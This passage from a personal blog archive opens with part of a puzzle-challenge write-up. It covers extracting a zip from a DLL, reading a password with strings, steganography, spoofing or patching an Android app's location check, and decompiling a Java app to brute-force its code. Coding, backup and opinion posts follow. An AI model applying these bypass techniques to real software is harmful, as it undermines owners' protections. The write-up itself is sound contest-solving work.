ran <code>grep egg *</code> on the files. Turns out TapTheXap.dll matches. Ok, let&rsquo;s see what&rsquo;s inside by viewing the
hexdump.</p>

<p>Right, so in there is an egg13.png, inside, what appears to be a PKZIP. So I guess the dll contains a zip file
with the egg in it. I&rsquo;ll give you a quick tip: you can unzip a zip file inside a dll by just doing
<code>unzip TapTheXap.dll</code>. I didn&rsquo;t know that at first, but anyway. Now it wants a password. Grrr. The password must
be in the app somewhere, so I just ran <code>strings TapTheXap.dll</code> to see what we&rsquo;ve got. This looks promising
<em>part 1: Dpbwob2HGo</em>. So there must be a part 2&hellip; ah there is. But it has no password. I wish I could tell you
I had a really cunning plan and found the second part that way, but I view the file in hex again and searched for
part 2 in it. Then I scrolled looking for any interesting data. Eventually I found <code>tapthexap.zip</code> followed by
a potential password. What else can I do but just give it a try. So add that part to the end of part1 and&hellip;. Success!!</p>

<h1 id="egg-0x14-boolean-101:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x14 - Boolean 101</h1>

<p>Here we are given 4 files, all with binary numbers inside. The image actually gives us instructions. What we need to
do here is take the data and perform the operations on it. I used a quick Python script to parse the files, remove the white
space and perform the required operations. Once you&rsquo;ve got that data save it to a new file and learn about
<a href="http://netpbm.sourceforge.net/">Netbpm</a>. Use this to generate the QR code.</p>

<h1 id="egg-0x15-jurrasic-hack:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x15 - Jurrasic Hack</h1>

<p>Big clue - Steganography. But which image. I figured out the image by just looking at the file sizes.
Alternatively the headers of the images (when viewed in hex) have big clue too. So I found out that the
stegasaurus was suspiciously larger than the others. That must be our candidate.</p>

<p>I spent ages trying different steno apps on OSX and linux, but nothing. I must be wrong I thought.
So I opened it up in a hex editor to see if that will give me some answers. There was something about
<em>Puff</em> - I did a search for it and there&rsquo;s a Windows steno tool call OpenPuff. I got a friend to download
and run it and sure enough, the egg&rsquo;s inside.</p>

<h1 id="egg-0x16-time-to-travel:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x16 - Time To Travel</h1>

<p>We need to go to where? Well relax. We don&rsquo;t really. Now, if you are on iPhone, I can&rsquo;t help
you specifically, but on Android you have to choices again. You can try a fakeGPS app to spoof
the GPS coordinates, or you can just edit the app and upload it to the device again. All you need to
do is find where the location coordinates are checked and override them. Get the egg and we&rsquo;re done.</p>

<h1 id="egg-0x17-egg-safe:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x17 - Egg Safe</h1>

<p>This Java application requires us to enter a number to unlock the safe. Ok, can we brute force it? Sure, but
it will take a while, so let&rsquo;s approach it a little more cleverly. So we can unzip a .jar file
and see what&rsquo;s inside. There we have an EggSafe.class - we can decompile this and take a look at what it does.
I used an online tool, but you can use whatever you wish. So we see that it&rsquo;s basically applying different algorithms to
each part of the number in order to compare them to known hashes. So what we need to do is <em>simply</em> do the same, but iterate
over the numbers 0 to 9999 inclusive. Go ahead,  give it a go. If you get stuck you can view
<a href="https://gist.github.com/Svenito/dbad0e83f0d637a5701c#file-getit-java">my solution</a>. Run it and enter the numbers into the app
to decode the image. I decoded the image to disk because the supplied app wasn&rsquo;t showing the image on my
machine for some reason.</p>

<h1 id="egg-0x18-paper-and-pen:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x18 - Paper And Pen</h1>

<p>I loved this one after a period of frustration. I&rsquo;ll try to outline how I managed to decode this from that to finish.
The hint here is that it&rsquo;s a paper and pen cipher, so first I looked up information on those and how they
work in principle. None of the ciphers really looked anything like the one we have. I kept at it and looked at what the
ciphers do and what their output means. Some use a keyword to encode the plain text, but it&rsquo;d be impossible to
decode without the keyword, and there wasn&rsquo;t anywhere that I could see a keyword. Others had the information
encoded inside the cipher text. So let&rsquo;s take a look at the text a little bit closer.</p>

<p><code>Dii2 Dii3 Di2 Gi1 Gi1 Aiii1 Diii2 Gi3 Aiii2 Gi2 Giii1 Dii3 Aiii3 Gii3 Di2 Diii3</code></p>

<p>We can see a few things here. The initial letter is either <em>A</em>, <em>D</em>, or <em>G</em>, then follows one of <em>i</em>, <em>ii</em>, <em>iii</em> and ends with
<em>1</em>, <em>2</em>, <em>3</em>. So that&rsquo;s actually 3 bits of information. Which could mean we&rsquo;re referencing 3D coordinates. What&rsquo;s the deal with
A, D, and G though? Oh, look, the are all the same distance apart. So that got me thinking. <em>ABC</em>, <em>DEF</em>, <em>GHI</em>.
Then I realised that those bits of information have 27 permutations, enough to chunk the alphabet into 3 groups.</p>

<p>So that&rsquo;s the first group, then the next bits of the alphabet go into a second 3x3 group and finally the last letters.
Each components is an index into one part. The letters tell you the line, the <em>i</em>&rsquo;s tell you the chunk and the number the column.</p>

<p>I ended up with this (forgive the crap ASCII table. I&rsquo;ll see about getting a nicer one):</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">-----------------------------------------
||    i      ||     ii    ||     iii   ||
-----------------------------------------
|| 1 | 2 | 3 || 1 | 2 | 3 || 1 | 2 | 3 ||
=========================================
|| A | B | C || J | K | L || S | T | U ||
-----------------------------------------
|| D | E | F || M | N | O || V | W | X ||
-----------------------------------------
|| G | H | I || P | Q | R || Y | Z |   ||
-----------------------------------------
</pre></div>
</p>

<p>So <em>Dii2</em> translates to <code>n</code>. Use the table to get the full text</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/04/12/thoughts-on-piracy/">
        Thoughts on piracy
      </a>
    </h1>

    <span class="post-date">Sat, Apr 12, 2014</span>

    <p>Piracy is rampant, or so certain media and copyright trolls would lead you to believe.
I&rsquo;m not sure how true this is as I have no access to figures proving it either way, and it would
require me to define at what level copying copyrighted stuff becomes <em>rampant</em>. Besides,
this is not really what I wanted to write about. I&rsquo;m more interested in airing a few
thoughts I&rsquo;ve had about some of the things going on around piracy.</p>

<p>Piracy, in the copyright sense, has been around for as long as can remember. Copying a
tape (a magnetic ribbon that stored data for those not as ancient as me) was not
a big issue. In fact companies manufactured tape decks with two cassette players
built in. Sometimes there was even a &ldquo;High speed dub&rdquo; option. Manufacturers enabled
you to copy content from one tape to another.</p>

<p>At this point though the physical media still had to be handed from person to person,
which meant it would take some time to reach a significant number of people. The internet
however changes that, you dump a small file on a tracker site and you&rsquo;ve made it available
to millions. So I guess that&rsquo;s enough reasons for all this copyright hoo-hah to increase
along side this.</p>

<p>So in this game we have three key players:</p>

<ul>
<li>The copyright owner</li>
<li>The pirate</li>
<li>The anti-piracy company (on behalf of he copyright owner)</li>
</ul>

<p>But here&rsquo;s the thing I don&rsquo;t get: anti-piracy companies. I get what they do, but I don&rsquo;t
get their stance. They get paid by a copyright holder (say Warner Brothers) to track down
who is distributing their property illegally. I won&rsquo;t get into the whole definition of
<em>property</em> after you make a purchase now either. So back to these anti-piracy folks.
They figure out who (or what IP) is distributing said data. They then send them some letters
asking for payment and threaten with court&hellip; you know the deal.</p>

<p>Every so often you hear these people complain about the evil of pirates, the damaging intents
of the people who wrote things like BitTorrent etc. They wish they were never born, never
made usenet, no one should pirate blah blah.</p>

<p>But correct me if I am wrong: these people&rsquo;s livelihood depends on pirates. Depends on this
technology. Especially BitTorrent which makes it so much easier to track down violators.
At least those that don&rsquo;t know how to protect themselves. If people stopped pirating then
these are the first people to suffer.</p>

<p>If the people who stopped pirating also didn&rsquo;t buy the stuff they pirated, then the studio
wouldn&rsquo;t benefit either. Chances are that most of the people who pirate will buy the things
they like/want anyway and have other reasons to pirate. Those that pirate because they can&rsquo;t/won&rsquo;t
buy the products won&rsquo;t buy the products either way. People pirate for all manner of reasons, not
just because they refuse to pay for it. Perhaps they cannot buy it where they live, or they want
to watch a DVD they bought a while ago but have moved to a different region and no longer have the
ability to play their film. It&rsquo;s not always to get on over of the <em>big guys</em>.</p>

<p>So if piracy came to an end, what would happen? Anti-piracy companies would go away and that&rsquo;s
about it. Sure, there might be some small increase in takings for movies etc, but I doubt it would
be anything noticeable. You might also suggest that piracy is a free form of advertising. If
person X says that they saw an early preview of a movie and loved it, chances are that person Y
will go see it. At the very least more and more people are talking about it. Be that movies, games,
books, music, what have you, the word gets around.</p>

<p>Perhaps I am wrong though. I am just writing down my thoughts. I don&rsquo;t claim to have done
extensive reasearch on this. These are just my opinions. Perhaps revenue for these
companies would increase drastically. Then again if you notice that a decent film makes a
killing at the box office, where a less that decent film flops, perhaps these big companies
should start making stuff people actually don&rsquo;t feel like they are wasting money if they spend
it on your product. Alternatively you could lower prices and then going to see a movie that turns
out to suck won&rsquo;t be such a big loss. You&rsquo;d spend a few units of your currency and if you didn&rsquo;t like
it, then so what? Fork over 10 times that and you&rsquo;ll think twice before you spend it.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/04/11/threading-python/">
        Threading Python
      </a>
    </h1>

    <span class="post-date">Fri, Apr 11, 2014</span>

    <p>Having helped my colleague deal with PyQt threads, I feel that
this gif sums up threading in Python very well:</p>

<p><img src="https://i.imgur.com/h7mePfx.gif" alt="threads" /></p>

<p>Happy Friday</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/04/10/rekindling-old-flames/">
        Rekindling old flames
      </a>
    </h1>

    <span class="post-date">Thu, Apr 10, 2014</span>

    <p>Some time ago, some long, long time ago, I started working on a ray tracer. Yes, you&rsquo;re
right, the world doesn&rsquo;t need another ray tracer. I wasn&rsquo;t writing another ray tracer though.
I was writing the ray tracer from <a href="http://www.raytracegroundup.com/">this book</a>. Well,
not line for line, but I was using it for the most part and just adjusting a few things
to my liking and style. Initially I started it because I was curious how these things
really work under the hood. The principles and concepts of a ray tracer weren&rsquo;t
foreign to me, but to actually implement one, component by component, that was new.
Then the project ground to a halt for what reason(s) I can&rsquo;t recall.</p>

<p>So fast forward today and, feeling somewhat ashamed about it, I&rsquo;ve decided to revive the project and
post the code on github. Right now I need to make sure the build still works and
that my system has all the dependencies, after that I&rsquo;ll push the code to
<a href="https://github.com/Svenito/lemon">https://github.com/Svenito/lemon</a> then I&rsquo;ll continue
building on the code from the book, chapter by chapter until, one day, Lemon will be complete.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/03/20/unit-testing-houdini-plugins-with-nose-and-coverage/">
        Unit testing Houdini Python plugins with nose and coverage
      </a>
    </h1>

    <span class="post-date">Thu, Mar 20, 2014</span>

    <p>We all know how important unit testing is, right? But often you wonder how can
you test a not so straight forward tool. In this case we&rsquo;re talking about a
Python script intended to run inside <a href="http://sidefx.com">Houdini</a>. In my specific
case the python script is launched from a script on a node when the user clicks
a button on the OTL. I want to run unit tests on this script, but the problem is
that the script parses a set of nodes and does various things according to the
types of nodes and layout of the nodes. It&rsquo;s clear that the HOM is required in the
unit tests. So I need to somehow run my unit tests inside houdini and have
some nodes available for my testing. Fortunately this isn&rsquo;t difficult to do, but
it does require a little setup and some fiddling in order to get it to work.</p>

<p>I&rsquo;ll be using <a href="https://nose.readthedocs.org">nose tests</a> as my test runner and
<a href="http://nedbatchelder.com/code/coverage/">coverage</a> for coverage testing.
Because I want to make sure I test as much code as possible. I created a hip file that
contains whatever nodes and connections I need to run most of the tests and saved
this to the same directory as my test script.</p>

<p>Before we write some code you will need to install <code>nose</code> and <code>coverage</code> and make
sure they work.</p>

<p>Now that we have all our dependencies installed, we need to import all the
modules we need and set some things up.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">import</span> <span style="color: #f8f8f2">nose</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">sys</span>
<span style="color: #f8f8f2">sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">path</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">insert(</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;../path_of_module&#39;</span><span style="color: #f8f8f2">)</span>

<span style="color: #f92672">import</span> <span style="color: #f8f8f2">os</span>
<span style="color: #f8f8f2">os</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">environ[</span><span style="color: #e6db74">&#39;NOSE_WITH_COVERAGE&#39;</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;1&#39;</span>
<span style="color: #f8f8f2">os</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">environ[</span><span style="color: #e6db74">&#39;NOSE_COVER_PACKAGE&#39;</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;module_to_test&#39;</span>

<span style="color: #f92672">import</span> <span style="color: #f8f8f2">hou</span>

<span style="color: #f92672">import</span> <span style="color: #f8f8f2">module_to_test</span>
</pre></div>


<p>We import the <code>nose</code> module and then we need to tell nose to make use of the
coverage package. <code>os.environ['NOSE_WITH_COVERAGE'] = '1'</code> does just that, and
<code>os.environ['NOSE_COVER_PACKAGE'] = 'module_to_test'</code> restricts our test results to
the module(s) we want to test. If you want to specify multiple modules simply
separate them with commas: <code>os.environ['NOSE_COVER_PACKAGE'] = 'module_to_test,another_module'</code></p>

<p>Unfortunately for this to work properly you need to patch nose&rsquo;s cover plugin.
There&rsquo;s a small bug in older versions, so depending on your distro you may need to
make the following change to
<code>nose/plugins/cover.py</code></p>

<p>Change these lines
<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">pkgs</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">[tolist(x)</span> <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">x</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">options</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">cover_packages]:</span>
    <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">coverPackages</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">extends(pkgs)</span>
</pre></div>
</p>

<p>to these lines
<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">pkgs</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">tolist(options</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">cover_packages):</span>
    <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">coverPackages</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">append(pkgs)</span>
</pre></div>
</p>

<p>Otherwise the <code>NOSE_COVER_PACKAGE</code> variable won&rsquo;t work properly.</p>

<p>I also setup the <code>sys.path</code> so that I load my local module rather
than the globally installed one. Depending on how your directories are laid out
you might not need this.</p>

<p>After this we need to import the <code>hou</code> module and finally the module(s) we want to test.</p>

<p>Then we write our main function which will load our hip file and start our tests</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">__name__</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&#39;__main__&#39;</span><span style="color: #f8f8f2">:</span>
    <span style="color: #f8f8f2">hou</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">hipFile</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">load(</span><span style="color: #e6db74">&#39;/path/to/test.hip&#39;</span><span style="color: #f8f8f2">)</span>

    <span style="color: #f8f8f2">nose</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">run(argv</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">[__file__],</span> <span style="color: #e6db74">&#39;--cover_html&#39;</span><span style="color: #f8f8f2">])</span>
</pre></div>
</p>

<p>As you can see, you can pass the commandline argments for nose into the run function.
With <code>--cover_html</code> we automatically generate the html coverage information. You
could omit this and run <code>coverage html</code> after the tests complete to generate the
html coverage pages instead. The output from the two methods is slightly different,
so pick the one that you prefer.</p>

<p>The next bits are up to you now, here you write your tests following a format like</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">def</span> <span style="color: #a6e22e">test_afunction</span><span style="color: #f8f8f2">():</span>
    <span style="color: #f8f8f2">node</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">hou</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">node(</span><span style="color: #e6db74">&#39;/obj/geo/box1&#39;</span><span style="color: #f8f8f2">)</span>
    <span style="color: #f8f8f2">result</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">module_to_test</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">do_stuff(node)</span>
    <span style="color: #66d9ef">assert</span> <span style="color: #f8f8f2">(result</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">4</span><span style="color: #f8f8f2">)</span>
</pre></div>
</p>

<p>You can access any and all <code>hou.</code> calls from your tests, so do what you must.</p>

<p>Once you are happy with your tests, or you just want to go ahead and test a single
one, we need to run the tests through hython. Bear in mind that you&rsquo;ll consume a
batch license when you run these tests.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">hython ./test.py
</pre></div>
</p>

<p>where <code>test.py</code> is the name of the file that contains the tests you wrote.
After a while you&rsquo;ll see your tests run and the coverage output. It should
look a little like this</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">...
Name          Stmts   Miss  Cover   Missing
-------------------------------------------
module_to_test  <span style="color: #ae81ff">25</span>     <span style="color: #ae81ff">14</span>    44%   1-2, 6, 9, 12-15, 21, 27-32
another_module  <span style="color: #ae81ff">314</span>    <span style="color: #ae81ff">173</span>    45%   4-20, 24, 37-38, 46
-------------------------------------------
TOTAL           <span style="color: #ae81ff">339</span>    <span style="color: #ae81ff">187</span>    45%   
----------------------------------------------------------------------
Ran <span style="color: #ae81ff">3</span> tests in 0.053s

OK
</pre></div>
</p>

<p>You&rsquo;ll also have a directory called <code>cover</code> which will contain the html output,
assuming you have the <code>--cover_html</code> flag on. If not, run <code>coverage html</code> and
after a short wait you will have a <code>htmlcov</code> directory with the html coverage
info.</p>

<p>I hope this helps you out if you ever wanted to unit test your Houdini Python
script. It&rsquo;s not as difficult as I thought, but it does take a little bit of setting
up to get everything to work right. There will still be some limitations as to what
you can test and get results for, but any testing is always better than none at
all I say.</p>

<p>And the <code>test.py</code> file as a whole</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">import</span> <span style="color: #f8f8f2">nose</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">sys</span>
<span style="color: #f8f8f2">sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">path</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">insert(</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;../path_of_module&#39;</span><span style="color: #f8f8f2">)</span>

<span style="color: #f92672">import</span> <span style="color: #f8f8f2">os</span>
<span style="color: #f8f8f2">os</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">environ[</span><span style="color: #e6db74">&#39;NOSE_WITH_COVERAGE&#39;</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;1&#39;</span>
<span style="color: #f8f8f2">os</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">environ[</span><span style="color: #e6db74">&#39;NOSE_COVER_PACKAGE&#39;</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;module_to_test&#39;</span>

<span style="color: #f92672">import</span> <span style="color: #f8f8f2">hou</span>

<span style="color: #f92672">import</span> <span style="color: #f8f8f2">module_to_test</span>


<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">test_afunction</span><span style="color: #f8f8f2">():</span>
    <span style="color: #f8f8f2">node</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">hou</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">node(</span><span style="color: #e6db74">&#39;/obj/geo/box1&#39;</span><span style="color: #f8f8f2">)</span>
    <span style="color: #f8f8f2">result</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">module_to_test</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">do_stuff(node)</span>
    <span style="color: #66d9ef">assert</span> <span style="color: #f8f8f2">(result</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">4</span><span style="color: #f8f8f2">)</span>


<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">__name__</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&#39;__main__&#39;</span><span style="color: #f8f8f2">:</span>
    <span style="color: #f8f8f2">hou</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">hipFile</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">load(</span><span style="color: #e6db74">&#39;/path/to/test.hip&#39;</span><span style="color: #f8f8f2">)</span>

    <span style="color: #f8f8f2">nose</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">run(argv</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">[__file__],</span> <span style="color: #e6db74">&#39;--cover_html&#39;</span><span style="color: #f8f8f2">])</span>
</pre></div>
</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/03/12/effort-vs-benefit/">
        Effort Vs Benefit
      </a>
    </h1>

    <span class="post-date">Wed, Mar 12, 2014</span>

    <p>How often have you thought: &ldquo;Everything would be a lot better if this
tool worked faster&rdquo;? Probably quite often. You&rsquo;ve most likely also heard the
saying &ldquo;Don&rsquo;t optimise prematurely&rdquo;. It&rsquo;s true, there&rsquo;s no point making
something faster if you don&rsquo;t know it&rsquo;s too slow. Don&rsquo;t waste time on
trying to optimise before you get some metrics telling you it needs it.</p>

<p>What you might not have thought about though is whether the speed increase
is actually worth it. Sure, for something like game development where
every nanosecond matters it&rsquo;s very critical, but in other situations,
it really depends on how the performance impacts the user&rsquo;s workflow.</p>

<p>A paper from 2011 titles <a href="https://www.dropbox.com/s/rqc3xpmtskxcxov/workflow.pdf">The Workflow Scale</a> covers this subject very well. It is targeted at
a specific industry and workflow, but the same applies elsewhere.
It says that the benefit of a speed increase to a workflow depends on
how it changes the behaviour of the user. It&rsquo;s a short but well
written paper that every developer should read.</p>

<p>I appreciate that it doesn&rsquo;t apply to all cases, but it&rsquo;s information
that should be taken on board. The next time you decide you should spend
some time improving the speed of a certain task, consider if the payoff is
worth the time you will spend making the improvement.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/03/05/a-little-less-mollusc/">
        A little less mollusc
      </a>
    </h1>

    <span class="post-date">Wed, Mar 5, 2014</span>

    <p>I&rsquo;ve migrated once more&hellip; from Octopress to a pure Jekyll blog.
The main reason is that I almost borked the octopress version again and
was struggling to get it fixed. This blog is much simpler and will be easier to
customise too.</p>

<p>UPDATE: I&rsquo;ve also managed to add Disqus to this blog and port all the old comments
to the new URLs, so all old comment threads are back with their posts.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/03/04/get-it-done/">
        Get it done
      </a>
    </h1>

    <span class="post-date">Tue, Mar 4, 2014</span>

    <p>A few years ago, during a particularily active developing phase I had an idea for a project.
I toyed with it in my head and thought about issues I might encounter. Will it work
in this situation? Is it something that will be useful? How do I make feature X work?
Do I need it to also do this? The usual stuff. So much so I never got round to starting it.
I figured it&rsquo;s ok, because someone else has done it and executed in a much better way.
Besides, who&rsquo;d want to use it anyway, right? It would only have been me.</p>

<p>So now I am browsing my newsfeed and come across this: <a href="https://flutterapp.com/">https://flutterapp.com/</a></p>

<p>That&rsquo;s pretty much what I was aiming to make back then. Just goes to show you doesn&rsquo;t it,
if you have an idea just go make it happen. Just because someone else has made it doesn&rsquo;t
mean you shouldn&rsquo;t make it again if you want. Perhaps you can do it better? We&rsquo;re not all
innovators, but we are all capable to make something different and perhaps better.
If you can&rsquo;t quite figure out how to do it, don&rsquo;t let that stop you from at least making a start.
Do something, anything, to get started. That&rsquo;s the hard part. Once you get started don&rsquo;t force
yourself to make it work in a day, or a week even. Take your time, do it as long as you enjoy it.</p>

<p>So I&rsquo;m going to take some of my own medicine and make a start on this project myself. It&rsquo;s been a
long time coming after all.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/02/26/back-it-up/">
        Back it up
      </a>
    </h1>

    <span class="post-date">Wed, Feb 26, 2014</span>

    

<p>For years I&rsquo;ve been paying for <a href="http://www.backblaze.com">Backblaze</a> in order to ensure
my photos, music, and other import data doesn&rsquo;t get lost in a hard drive crash, theft or fire.
I don&rsquo;t think I really need to go over all the reason why you should backup your data, do I?
But you should at least have a local backup, and ideally an offsite one too.</p>

<p>So why did I stop paying for Backblaze? No real reason. It came up to the renewal date
and I thought &ldquo;I wonder if I can do this a little cheaper perhaps?&rdquo;. After all, I&rsquo;m not
a stranger to technology.</p>

<p>For Christmas I was lovingly gifted a 2TB
<a href="http://www.wdc.com/en/products/products.aspx?id=280">WD Mybook Live drive</a>
and thought this is what I will use for backups (amongst other things). To give you
an overview of what I need to backup:</p>

<ul>
<li>Around 40GB of photos</li>
</ul>

<p>I don&rsquo;t take a lot of photos, after all, I&rsquo;m no professional, but those that I do
take are dear to me. So they need to be backed up</p>

<ul>
<li><p>MP3s</p>

<p>Well, I actually have those on Google Play, so they are already kinda backed up.</p></li>

<li><p>A few MB of documents</p>

<p>The usual stuff like invoices, receipts, correspondence, etc</p></li>

<li><p>A few GB of code</p>

<p>It&rsquo;s what I do. So there&rsquo;s quite a bit of it, and not all of it is on Github.</p></li>
</ul>

<p>This is all spread across an old iMac I rarely use and a MacBook Pro which is my
daily use machine. I also want to have a local backup and an offsite backup.</p>

<p>So first off I had to pick some software that will at least copy the relevant files
to the WD and create snapshots as a bonus. Because I&rsquo;m an old command line lover, I
first opted for <a href="http://www.nongnu.org/rdiff-backup/">rdiff-backup</a> which, after some
set up and testing, worked really well. I&rsquo;d run the backup whenever I changed some
important files, or at least once a week. Then, on Sunday I would rsync the backup onto
a memory stick which I always have with me.</p>

<p>This was fine until my connection dropped in the middle of
a backup operation. What happens then is that the target dir is corrupt and rdiff-backup
tries to roll back the recent backup. Which is fine in most cases, but in my case something
got stuck and it never completed the roll back.
I blew the directory away and started again, during which I looked at some alternatives (free),
seeing as I now had some time to kill.</p>

<p>First I thought &ldquo;I can give this Time Machine thing a try. After all, it&rsquo;s free and
it&rsquo;s built right into the OS (sorta)&ldquo;. For some reason though it wouldn&rsquo;t let me select a mount
as a backup target. Probably because they don&rsquo;t want you backing your local disks to
your local disks?</p>

<p>So that was out of the question. Then I thought I would checkout <a href="http://www.crashplan.com">Crashplan</a>
as they were always coming up as an alternative to Backblaze and is also cross platform.
I checked out their free service which allows you to backup to a remote host, and
conveniently it also supports backing up to local folders.</p>

<p>So I downloaded it, did a basic setup and fired it off, along with an up-to-date
rdiff-backup. Both take a little bit of time as it&rsquo;s the first backup, but that doesn&rsquo;t
bother me much, the incrementals will be quicker. What I wanted to know was how big the
backup will be.</p>

<p>Surprisingly Crashplan&rsquo;s initial backup is over 1GB less than the rdiff-backup. I imagine
that it will get bigger, as I have it set to keep a longer history, but still, that&rsquo;s
quite a saving. It also runs in the background, so no manual intervention needed.
It&rsquo;ll just tick along and backup behind the scenes just like Backblaze did.</p>

<p>As for my offsite, I&rsquo;ll still use my USB stick with rdiff-backup mostly because
I need to copy the data onto a remote machine with rsync. Crashplan creates a single file for the backup
which will be a pain to copy each time. Using rsync to copy off an rdiff backup is
much quicker after the initial.</p>

<h2 id="summary:452007e1b02afdfb52b4409ed9fffdbd">Summary</h2>

<p>So basically I am now running Crashplan locally having left Backblaze. I will say
that I would have stayed with Backblaze if I wasn&rsquo;t prone to tinkering and I
wasn&rsquo;t averse shelling out a bit extra for a family plan. As it is, I can now
backup all the machines in the house for the price of nothing
(plus hardware accessories ;))</p>

<p>I&rsquo;ve only been running it for a day so far, so time will tell if it&rsquo;s as good
Backblaze, but so far this is the backup solution I am going with. I&rsquo;ll update
this post with any discoveries if they are minor, or write new posts if they
require a bit more space.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/02/25/sorting/">
        Sorting
      </a>
    </h1>

    <span class="post-date">Tue, Feb 25, 2014</span>

    <p>A very quick post about sorting a list of objects in python. Suppose you have a
list of same objects and you wish to sort them based on one of these attributes, perhaps
a return value from a method. There&rsquo;s a really nice way to do it in place:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">sort_by</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&#39;name&#39;</span><span style="color: #f8f8f2">:</span>
    <span style="color: #f8f8f2">people</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sort(key</span><span style="color: #f92672">=</span><span style="color: #66d9ef">lambda</span> <span style="color: #f8f8f2">x:</span> <span style="color: #f8f8f2">str(x</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">get_name()),</span> <span style="color: #f8f8f2">reverse</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">reverse)</span>
<span style="color: #66d9ef">elif</span> <span style="color: #f8f8f2">sort_by</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&#39;age&#39;</span><span style="color: #f8f8f2">:</span>
    <span style="color: #f8f8f2">people</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sort(key</span><span style="color: #f92672">=</span><span style="color: #66d9ef">lambda</span> <span style="color: #f8f8f2">x:</span> <span style="color: #f8f8f2">x</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">get_age(),</span> <span style="color: #f8f8f2">reverse</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">reverse)</span>
</pre></div>


<p>As you can see I wrapped the <code>get_name</code> call in a <code>str()</code> because
in this case it was returning something else. I didn&rsquo;t have control over the
code for the user class.</p>

